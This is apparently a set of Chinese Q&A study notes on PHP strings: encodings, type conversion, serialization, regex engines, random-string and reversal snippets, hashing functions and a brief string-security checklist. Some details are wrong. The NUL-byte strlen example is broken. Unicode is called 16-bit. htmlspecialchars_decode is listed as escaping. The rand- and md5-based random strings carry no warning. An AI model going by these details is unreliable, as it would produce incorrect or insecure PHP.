&lt;h2 id=&quot;字符串在底层是如何实现的什么决定着字符串的长度&quot;&gt;字符串在底层是如何实现的，什么决定着字符串的长度？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;PHP 中的 string 的实现方式是一个由字节组成的数组再加上一个整数指明缓冲区长度。并无如何将字节转换成字符的信息，由程序员来决定。字符串由什么值来组成并无限制；特别的，其值为 0（“NUL bytes”）的字节可以处于字符串任何位置（不过有几个函数，在本手册中被称为非“二进制安全”的，也许会把 NUL 字节之后的数据全都忽略）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;字符串类型的此特性解释了为什么 PHP 中没有单独的“byte”类型 - 已经用字符串来代替了。返回非文本值的函数 - 例如从网络套接字读取的任意数据 - 仍会返回字符串。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;php并不特别知名字符串的编码那字符串到底时怎样编码的呢&quot;&gt;PHP并不特别知名字符串的编码，那字符串到底时怎样编码的呢？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;字符串会被按照该脚本文件相同的编码方式来编码。因此如果一个脚本的编码是 ISO-8859-1，则其中的字符串也会被编码为 ISO-8859-1，以此类推。不过这并不适用于激活了 Zend Multibyte 时；此时脚本可以是以任何方式编码的（明确指定或被自动检测）然后被转换为某种内部编码，然后字符串将被用此方式编码。注意脚本的编码有一些约束（如果激活了 Zend Multibyte 则是其内部编码）- 这意味着此编码应该是 ASCII 的兼容超集，例如 UTF-8 或 ISO-8859-1。不过要注意，依赖状态的编码其中相同的字节值可以用于首字母和非首字母而转换状态，这可能会造成问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;某些函数假定字符串是以单字节编码的，但并不需要将字节解释为特定的字符。例如 substr()，strpos()，strlen() 和 strcmp()。理解这些函数的另一种方法是它们作用于内存缓冲区，即按照字节和字节下标操作。
某些函数被传递入了字符串的编码方式，也可能会假定默认无此信息。例如 htmlentities() 和 mbstring 扩展中的大部分函数。
其它函数使用了当前区域（见 setlocale()），但是逐字节操作。例如 strcasecmp()，strtoupper() 和 ucfirst()。这意味着这些函数只能用于单字节编码，而且编码要与区域匹配。例如 strtoupper(“á”) 在区域设定正确并且 á 是单字节编码时会返回 “Á”。如果是用 UTF-8 编码则不会返回正确结果，其结果根据当前区域有可能返回损坏的值。
最后一些函数会假定字符串是使用某特定编码的，通常是 UTF-8。intl 扩展和 PCRE（上例中仅在使用了 u 修饰符时）扩展中的大部分函数都是这样。尽管这是由于其特殊用途，utf8_decode() 会假定 UTF-8 编码而 utf8_encode() 会假定 ISO-8859-1 编码。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;非二进制安全是什么意思&quot;&gt;非“二进制安全”是什么意思？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;在PHP中经常看到一些函数有个标识「binary safe」，即二进制安全，这是个什么概念呢？ 在一个字符串中会包含很多的字符，这其中就包括NULL。「binary safe」的函数会把它的输入字符串原封不动的进行处理；而非「binary safe」的函数是在底层直接调用C的字符串相关的函数，而这些函数处理一个字符串会把NULL后边的内容忽略掉。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;以下例子中，如果函数strlen是binary safe的话，我们将得到7；如果函数是非binary safe的话，我们将得到3 ，由于strlen是binary safe的，所以实际上以下的运行结果是7：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$str = &quot;abcx00abc&quot;; //x00为NULL
echo strlen($str);  //7
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;字符串的编码方式&quot;&gt;字符串的编码方式&lt;/h1&gt;

&lt;h2 id=&quot;什么是位什么是字节&quot;&gt;什么是位？什么是字节？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据存储是以“字节”（Byte）为单位，数据传输是以“位”（bit）为单位，一个位就代表一个0或1（即二进制），每8个位（bit，简写为b）组成一个字节（Byte，简写为B）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是ascii编码如何编码&quot;&gt;什么是ascii编码，如何编码？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;美国标准信息交换码 (ASCII) （ASCII：将英语中的字符表示为数字的代码。为每个字符分配一个介于 0 到 127 之间的数字。大多数计算机都使用 ASCII 表示文本和在计算机之间传输数据。）（发音为 ask-kee）。ASCII 表包含 128 个数字，分配给了相应的字符 （字符：字母、数字、标点或符号。）。ASCII 为计算机提供了一种存储数据和与其他计算机及程序交换数据的方式。
因为1位二进制数可以表示（2-1）=2种状态：0、1；而2位二进制数可以表示（2-2）=4种状态：00、01、10、11；依次类推，7位二进制 数可以表示（2-7）=128种状态，每种状态都唯一地编为一个7位的二进制码，对应一个字符（或控制码），这些码可以排列成一个十进制序号0～127。所 以，7位ASCII码是用七位二进制数进行编码的，可以表示128个字符。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位（bit）有0和1两种状态，因此八个二进制位就可以组合出256种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从0000000到11111111。
上个世纪60年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为ASCII码，一直沿用至今。
ASCII码一共规定了128个字符的编码，比如空格”SPACE”是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是unicode编码&quot;&gt;什么是Unicode编码？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Unicode码扩展自ASCII字元集。在严格的ASCII中，每个字元用7位元表示，或者电脑上普遍使用的每字元有8位元宽；而Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用於电脑通讯的字元、象形文字和其他符号。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。
可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是Unicode，就像它的名字都表示的，这是一种所有符号的编码。
Unicode当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字”严”。具体的符号对应表，可以查询unicode.org，或者专门的汉字对应表。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。
比如，汉字”严”的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。
这里就有两个严重的问题，第一个问题是，如何才能区别Unicode和ASCII？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果Unicode统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。
它们造成的结果是：1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。2）Unicode在很长一段时间内无法推广，直到互联网的出现。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何在xm中用unicode表示汉字&quot;&gt;如何在xm中用Unicode表示汉字？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;\u5982\u4f55\u5728\u78\u6d\u4e2d\u7528\u55\u6e\u69\u63\u6f\u64\u65\u8868\u793a\u6c49\u5b57\uff1f
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;utf-8和gbk编码原理&quot;&gt;UTF-8和GBK编码原理&lt;/h1&gt;

&lt;h2 id=&quot;什么是utf_8编码&quot;&gt;什么是UTF_8编码？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;互联网的普及，强烈要求出现一种统一的编码方式。UTF-8就是在互联网上使用最广的一种Unicode的实现方式。其他实现方式还包括UTF-16（字符用两个字节或四个字节表示）和UTF-32（字符用四个字节表示），不过在互联网上基本不用。重复一遍，这里的关系是，&lt;strong&gt;UTF-8是Unicode的实现方式之一&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;utf-8编码有什么规律&quot;&gt;UTF-8编码有什么规律？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
UTF-8的编码规则很简单，只有二条：&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。&lt;/li&gt;
    &lt;li&gt;对于n字节的符号（n&amp;gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;Unicode符号范围(十六进制）         UTF-8编码方式（二进制）
0000 0000 - 0000 007F   | 0xxxxxxx
0000 0080 - 0000 07FF   | 110xxxxx 10xxxxxx
0000 0800 - 0000 FFFF   | 1110xxxx 10xxxxxx 10xxxxxx
0001 0000 - 0010 FFFF   | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;utf8中汉字到底占几个字节&quot;&gt;UTF8中汉字到底占几个字节？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;UTF-8编码是变长编码，通常汉字占三个字节，扩展B区以后的汉字占四个字节。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;已知”严”的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此”严”的UTF-8编码需要三个字节，即格式是”1110xxxx 10xxxxxx 10xxxxxx”。然后，从”严”的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，”严”的UTF-8编码是”11100100 10111000 10100101”，转换成十六进制就是E4B8A5。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;带有签名的utf-8时怎么回事&quot;&gt;带有签名的UTF-8时怎么回事？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Unicode编码中表示字节排列顺序的那个文件头，叫做BOM（byte-order mark），FFFE和FEFF就是不同的BOM。
UTF-8文件的BOM是“EF BB BF”，但是UTF-8的字节顺序是不变的，因此这个文件头实际上不起作用。有一些编程语言是ISO-8859-1编码，所以如果用UTF-8针对这些语言编程序，就必须去掉BOM，即保存成“UTF-8—无BOM”的格式才可以，PHP语言就是这样。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;用文本编辑软件UltraEdit中的”十六进制功能”，观察该文件的内部编码方式。
或在VIM敲入&lt;code&gt;:%!xxd&lt;/code&gt; (&lt;code&gt;:%!xxd -r&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;ANSI：文件的编码就是两个字节”D1 CF”，这正是”严”的GB2312编码，这也暗示GB2312是采用大头方式存储的。&lt;/li&gt;
  &lt;li&gt;Unicode：编码是四个字节”FF FE 25 4E”，其中”FF FE”表明是小头方式存储，真正的编码是4E25。&lt;/li&gt;
  &lt;li&gt;Unicode big endian：编码是四个字节”FE FF 4E 25”，其中”FE FF”表明是大头方式存储。&lt;/li&gt;
  &lt;li&gt;UTF-8：编码是六个字节”EF BB BF E4 B8 A5”，前三个字节”EF BB BF”表示这是UTF-8编码，后三个”E4B8A5”就是”严”的具体编码，它的存储顺序与编码顺序是一致的。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;gb2312和gbk编码是怎么来的&quot;&gt;GB2312和GBK编码是怎么来的？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;GB 2312 或 GB 2312-80 是中华人民共和国国家标准简体中文字符集，全称《信息交换用汉字编码字符集·基本集》，又称GB0，由中国国家标准总局发布&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;GB 2312的出现，基本满足了汉字的计算机处理需要，它所收录的汉字已经覆盖中国大陆99.75%的使用频率。但对于人名、古汉语等方面出现的罕用字和繁体字，GB 2312不能处理，因此后来GBK及GB 18030汉字字符集相继出现以解决这些问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;GBK即汉字内码扩展规范，K为汉语拼音 Kuo Zhan（扩展）中“扩”字的声母。英文全称Chinese Internal Code Specification。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;gbk和utf8该如何选择&quot;&gt;GBK和UTF8该如何选择？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;使用GBK则每个字符占用2个字节，而使用UTF－8英文却只占一个字节。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么时候要用多字节转码函数&quot;&gt;什么时候要用多字节转码函数？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;虽然许多语言每个必要字符都能一对一映射到 8 比特（bit）的值，但也有好几种语言需要非常多的字符来书面通讯，以至于它们的编码范围不能仅仅包含在一个字节里（一个字节 Byte 由 8 比特 bit 构成。每一比特仅能包含两种不同的值： 1 或 0。所以，一字节仅能够表示 256 种不同的值，即 2 的八次方）。 开发多字节字符编码方案是为了在基于字节的常规编码系统中表达超过 256 个字符。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;在你操作（trim、split、splice 等等）多字节编码的字符串的时候，由于在这种编码方案下，两个或多个连续字节可能只表达了一个字符，所以你需要使用专门的函数。 否则，当你将不能检测多字节字符串的函数应用到这个字符串的时候，它可能无法检测多字节字符的起始位置，并以乱码字符串结尾，基本丢失了它原来的意思。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;mbstring 提供了针对多字节字符串的函数，能够帮你处理 PHP 中的多字节编码。 除此以外，mbstring 还能在可能的字符编码之间相互进行编码转换。 为了方便起见，mbstring 设计成了处理基于 Unicode 的编码，类似 UTF-8、UCS-2 及诸多单字节的编码（在以下列出了）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;多字节转码函数mbstring和iconv有什么区别如何选择&quot;&gt;多字节转码函数mbstring和iconv有什么区别，如何选择？&lt;/h2&gt;

&lt;p&gt;PHP supports multi byte in two extensions: iconv  and mbstring&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;iconv uses an external library (supports more encodings but less portable)&lt;/li&gt;
  &lt;li&gt;mbstring has the library bundled with PHP (less encodings but more portable)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;在开发中如何做怎么才能不乱码&quot;&gt;在开发中，如何做怎么才能不乱码？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;使用多字节字符串函数，如：
mb_substr 根据字符数执行一个多字节安全的 substr() 操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;绝对乱码现象如何产生的&quot;&gt;“绝对乱码”现象如何产生的？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;字符串类型转换&quot;&gt;字符串类型转换&lt;/h1&gt;

&lt;h2 id=&quot;其它数据类型转换为字符串有什么规律&quot;&gt;其它数据类型转换为字符串有什么规律？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个值可以通过在其前面加上 (string) 或用 strval() 函数来转变成字符串。在一个需要字符串的表达式中，会自动转换为 string。比如在使用函数 echo 或 print 时，或在一个变量和一个 string 进行比较时，就会发生这种转换。类型和类型转换可以更好的解释下面的事情，也可参考函数 settype()。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个布尔值 boolean 的 TRUE 被转换成 string 的 “1”。Boolean 的 FALSE 被转换成 ““（空字符串）。这种转换可以在 boolean 和 string 之间相互进行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个整数 integer 或浮点数 float 被转换为数字的字面样式的 string（包括 float 中的指数部分）。使用指数计数法的浮点数（4.1E+6）也可转换。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;数组 array 总是转换成字符串 “Array”，因此，echo 和 print 无法显示出该数组的内容。要显示某个单元，可以用 echo $arr[‘foo’] 这种结构。要显示整个数组内容见下文。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;在 PHP 4 中对象 object 总是被转换成字符串 “Object”，如果为了调试原因需要打印出对象的值，请继续阅读下文。为了得到对象的类的名称，可以用 get_class() 函数。自 PHP 5 起，适当时可以用 __toString 方法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;资源 resource 总会被转变成 “Resource id #1” 这种结构的字符串，其中的 1 是 PHP 在运行时分配给该 resource 的唯一值。不要依赖此结构，可能会有变更。要得到一个 resource 的类型，可以用函数 get_resource_type()。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;NULL 总是被转变成空字符串。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;如上面所说的，直接把 array，object 或 resource 转换成 string 不会得到除了其类型之外的任何有用信息。可以使用函数 print_r() 和 var_dump() 列出这些类型的内容。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;大部分的 PHP 值可以转变成 string 来永久保存，这被称作串行化，可以用函数 serialize() 来实现。如果 PHP 引擎设定支持 WDDX，PHP 值也可被串行化为格式良好的 XML 文本。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是串行化实现串行化有哪些常用方法&quot;&gt;什么是“串行化”？实现“串行化”有哪些常用方法？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;串行化(Serialization)是计算机科学中的一个概念，它是指将对象存储到介质（如文件、内存缓冲区等）中或是以二进制方式通过网络传输。之后可以通过反串行化从这些连续的字节（byte）数据重新构建一个与原始对象状态相同的对象，因此在特定情况下也可以说是得到一个副本，但并不是所有情况都这样。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;序列化在计算机科学中通常有以下定义:&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;对同步控制而言，表示强制在同一时间内进行单一存取。&lt;/li&gt;
    &lt;li&gt;在数据储存与传送的部分是指将一个对象存储至一个储存媒介，例如档案或是记亿体缓冲等，或者透过网络传送资料时进行编码的过程，可以是字节或是XML等格式。而字节的或XML编码格式可以还原完全相等的对象。这程序被应用在不同应用程序之间传送对象，以及服务器将对象储存到档案或数据库。相反的过程又称为反序列化。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;serialize&lt;/code&gt;/&lt;code&gt;unserialize&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;json_encode&lt;/code&gt;/&lt;code&gt;json_decode&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;wddx_serialize_value&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;正则表达式&quot;&gt;正则表达式&lt;/h1&gt;

&lt;h2 id=&quot;什么是posix兼容表达式&quot;&gt;什么是POSIX兼容表达式？&lt;/h2&gt;

&lt;h2 id=&quot;什么时perl兼容正则表达式pcre&quot;&gt;什么时Perl兼容正则表达式（PCRE）？&lt;/h2&gt;

&lt;h2 id=&quot;pcre和posix的对比有什么不同该如何选择&quot;&gt;PCRE和POSIX的对比有什么不同，该如何选择？&lt;/h2&gt;

&lt;p&gt;自 PHP 5.3.0起， POSIX 正则表达式扩展被废弃。在 POSIX 正则和 PCRE 正则之间有一些不同，本页列出了在转向PCRE 时最显著的需要知道的不同点。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;PCRE 函数需要模式以分隔符闭合。&lt;/li&gt;
  &lt;li&gt;不像POSIX，PCRE 扩展没有专门用于大小写不敏感匹配的函数。取而代之的是，支持使用i (PCRE_CASELESS) 模式修饰符完成同样的工作。 其他模式修饰符同样可用于改变匹配策略。&lt;/li&gt;
  &lt;li&gt;POSIX 函数从最左面开始寻找最长的匹配，但是 PCRE 在第一个合法匹配后停止。如果字符串 不匹配这没有什么区别，但是如果匹配，两者在结果和速度上都会有差别。 为了说明这个不同, 考虑下面的例子(来自Jeffrey Friedl 的《精通正则表达式》一书)。 使用模式 one(self)?(selfsufficient)? 在字符串oneselfsufficient 上匹配，PCRE 会匹配到oneself，但是使用 POSIX，结果将是整个字符串 oneselfsufficient。 两个子串都匹配原始字符串，但是 POSIX 将 最长的最为结果。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;pcre正则的书写有什么技巧&quot;&gt;PCRE正则的书写有什么技巧？&lt;/h2&gt;

&lt;h2 id=&quot;正则表达式匹配的原理是什么&quot;&gt;正则表达式匹配的原理是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;正则引擎大体上可分为不同的两类：DFA和NFA，而NFA又基本上可以分为传统型NFA和POSIX NFA。
DFA Deterministic finite automaton 确定型有穷自动机
NFA Non-deterministic finite automaton　非确定型有穷自动机&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;DFA引擎因为不需要回溯，所以匹配快速，但不支持捕获组，所以也就不支持反向引用和$number这种引用方式，目前使用DFA引擎的语言和工具主要有awk、egrep 和 lex&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;POSIX NFA主要指符合POSIX标准的NFA引擎，它的特点主要是提供longest-leftmost匹配，也就是在找到最左侧最长匹配之前，它将继续回溯。同DFA一样，非贪婪模式或者说忽略优先量词对于POSIX NFA同样是没有意义的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;优先选择最左端的匹配结果&lt;/li&gt;
  &lt;li&gt;标准量词是匹配优先的&lt;/li&gt;
  &lt;li&gt;DFA：文本主导&lt;/li&gt;
  &lt;li&gt;NFA：表达式主导&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;回溯(backtracking)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;NFA引擎最重要的性质是：它会一次处理各个子表达式或组成元素，遇到需要在两个可能成功的可能中进行选择的时候，它会选择其一，同时记住其他结果，以备后续需要。
需要做出选择的情形包括 量词（决定是否尝试另一次匹配）和多选结构（决定选择哪个多选分支）两个要点：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;如果需要在“进行尝试”和“跳过尝试”之间选择，对于匹配优先量词来说，引擎会优先选择“进行尝试”，对于忽略优先量词来说，会选择“跳过尝试” 。&lt;/li&gt;
  &lt;li&gt;距离当前最近存储的选项就是当本地失败强制回溯返回的。使用的原则是LIFO（last in first out，后进先出）。&lt;/li&gt;
  &lt;li&gt;实际上，NFA搜索的过程算法就是深度优先，只不过并不一定完全遍历，完成匹配之后就停止搜索了。&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;字符串函数&quot;&gt;字符串函数&lt;/h1&gt;

&lt;h2 id=&quot;如何能巧妙的记忆php中常用字符串函数&quot;&gt;如何能巧妙的记忆PHP中常用字符串函数？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;第一个函数都是&lt;code&gt;string&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;字符串常见算法和原理&quot;&gt;字符串常见算法和原理&lt;/h1&gt;

&lt;h2 id=&quot;字符串常用算法如何随机生成字符串&quot;&gt;字符串常用算法–如何随机生成字符串？&lt;/h2&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i &amp;lt; $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function generateRandomString($length = 10) {
    return substr(str_shuffle(&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;), 0, $length);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$random = substr( md5(rand()), 0, 7);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function rndStr($len = 64) {
     $randomData = file_get_contents('/dev/urandom', false, null, 0, $len) . uniqid(mt_rand(), true);
     $str = substr(str_replace(array('/','=','+'),'', base64_encode($randomData)),0,$len);
    return $str;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;字符串常用算法如何实现字符串反转&quot;&gt;字符串常用算法–如何实现字符串反转？&lt;/h2&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;strrev
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$len = mb_strlen($str);
for($i=$len-1; $i&amp;gt;=0; $i--) {
	$result .= mb_substr($str,$i,1,$encoding);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;preg_match_all('/./us', $str, $ar);
return implode('',array_reverse($ar[0]));
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;字符串常用算法如何对字符串加密解密&quot;&gt;字符串常用算法–如何对字符串加密解密？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;crypt&lt;/code&gt;单向字符串散列&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;crc32&lt;/code&gt;计算一个字符串的 crc32 多项式&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;hash&lt;/code&gt;生成哈希值 （消息摘要）&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;hash_file&lt;/code&gt;使用给定文件的内容生成哈希值&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;hash_hmac&lt;/code&gt;使用 HMAC 方法生成带有密钥的哈希值&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;md5&lt;/code&gt;计算字符串的 MD5 散列值&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;sha1&lt;/code&gt;计算字符串的 sha1 散列值&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;password_hash&lt;/code&gt;计算密码的哈希值&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;base64_encode&lt;/code&gt;Encodes data with MIME base64&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code&gt;mcrypt_encrypt&lt;/code&gt; &amp;amp; &lt;code&gt;mcrypt_decrypt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;字符串常用算法如何对字符串安全处理&quot;&gt;字符串常用算法–如何对字符串安全处理？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;SQL注入
    &lt;ul&gt;
      &lt;li&gt;设置字符集&lt;code&gt;mysql_set_charset&lt;/code&gt; and &lt;code&gt;mysql:host=$host;dbname=$db;charset=utf8&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;参数绑定&lt;code&gt;PDO::bindValue PDO::bindParam&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;禁止本地PDO库模拟prepare（如果数据库支持prepare）&lt;code&gt;$pdo-&amp;gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Shell注入
    &lt;ul&gt;
      &lt;li&gt;escapeshellarg&lt;/li&gt;
      &lt;li&gt;escapeshellcmd&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;过滤
    &lt;ul&gt;
      &lt;li&gt;&lt;code&gt;filter_var($email, FILTER_VALIDATE_EMAIL)&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;filter_var($email, FILTER_SANITIZE_EMAIL)&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;转义
    &lt;ul&gt;
      &lt;li&gt;&lt;code&gt;htmlspecialchars_decode&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

